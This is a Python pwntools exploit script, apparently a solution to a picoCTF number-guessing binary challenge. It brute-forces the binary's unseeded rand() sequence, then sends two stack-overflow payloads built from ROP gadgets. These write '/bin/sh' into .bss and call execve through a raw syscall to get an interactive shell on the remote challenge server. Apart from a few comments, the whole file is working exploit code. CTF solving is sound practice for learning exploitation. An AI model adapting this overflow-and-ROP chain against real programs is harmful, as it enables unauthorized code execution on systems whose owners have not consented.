from pwn import *
from struct import *
from Crypto.Util.number import bytes_to_long

exe = ELF("./vuln", checksec=False)
context.binary = exe
context.terminal = "konsole -e".split()
context.log_level = "warning"

def getRandomSequence(until: int):
    '''program does not provide a dynamic seed to the rand()
    function, therefore the random sequence of number generated 
    is the same for each execution.'''
    def sending(exe: process,toSend):
        exe.sendlineafter(b"What number would you like to guess?\n", bytes(str(toSend), "utf-8"))
        txt = exe.recv(100)
        if b"Nope" not in txt:
            # print("[+] rand:", toSend)
            exe.send(b"dimas\n")
            return toSend
        return None
    rand_seq = []
    for iter in range(until):
        for toSend in range(1, 101):
            with process() as p:
                if len(rand_seq) != 0:
                    for iterSend in rand_seq:
                        seq = sending(p, iterSend)
                seq = sending(p, toSend)
                if seq != None:
                    rand_seq.append(seq)
                    break
    return rand_seq

# key = getRandomSequence(10)
# breakpoint()
key = [84, 87, 78, 16, 94, 36, 87, 93, 50, 22]
rp = ROP(exe)
bss = 0x6bc398 #base .bss

# p = process()
p = remote("jupiter.challenges.picoctf.org", 51462)
# attach(p, gdbscript="break *win+75\ncontinue")

p.sendlineafter(b"What number would you like to guess?\n", bytes(str(key[0]), "utf-8"))
payload = b""
payload += b"\x90"*120
payload += pack("<Q", rp.find_gadget(["pop rdi", "ret"])[0])
payload += pack("<Q", 0)
payload += pack("<Q", rp.find_gadget(["pop rsi", "ret"])[0])
payload += pack("<Q", bss)
payload += pack("<Q", rp.find_gadget(["pop rdx", "ret"])[0])
payload += pack("<Q", 20)
payload += pack("<Q", exe.symbols["read"])
payload += pack("<Q", exe.symbols["main"])
p.sendlineafter(b"Name? ", payload)

p.sendline(b'/bin/sh\x00')

p.sendlineafter(b"What number would you like to guess?\n", bytes(str(key[1]), "utf-8"))
payload = b""
payload += b"\x90"*120
payload += pack("<Q", rp.find_gadget(["pop rax", "ret"])[0])
payload += pack("<Q", 0x3b)
payload += pack("<Q", rp.find_gadget(["pop rdi", "ret"])[0])
payload += pack("<Q", bss)
payload += pack("<Q", rp.find_gadget(["pop rsi", "ret"])[0])
payload += pack("<Q", 0x0)
payload += pack("<Q", rp.find_gadget(["pop rdx", "ret"])[0])
payload += pack("<Q", 0x0)
payload += pack("<Q", rp.find_gadget(["syscall"])[0])
p.sendlineafter(b"Name? ", payload)
p.interactive()

